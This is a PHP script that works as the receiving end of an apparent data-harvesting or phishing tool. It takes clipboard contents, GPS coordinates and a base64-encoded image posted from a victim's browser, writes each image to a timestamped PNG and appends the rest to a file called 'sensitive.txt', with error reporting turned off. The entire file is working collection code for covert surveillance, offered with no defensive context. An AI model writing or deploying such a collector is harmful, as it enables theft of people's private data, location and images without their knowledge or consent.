<?php
error_reporting(0);

$clipboard = $_POST['clipboard'] ?? 'No clipboard data';
$latitude = $_POST['latitude'] ?? 'No latitude';
$longitude = $_POST['longitude'] ?? 'No longitude';
$imageData = $_POST['image'] ?? null;

if ($imageData) {
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $date = date('YmdHis');
    file_put_contents("image_$date.png", $unencodedData);
}

$file = fopen('sensitive.txt', 'a');
fwrite($file, "Date: " . date("Y-m-d H:i:s") . "\n");
fwrite($file, "Clipboard: $clipboard\n");
fwrite($file, "Latitude: $latitude, Longitude: $longitude\n");
fwrite($file, "------------------------------------------------------\n");
fclose($file);
?>
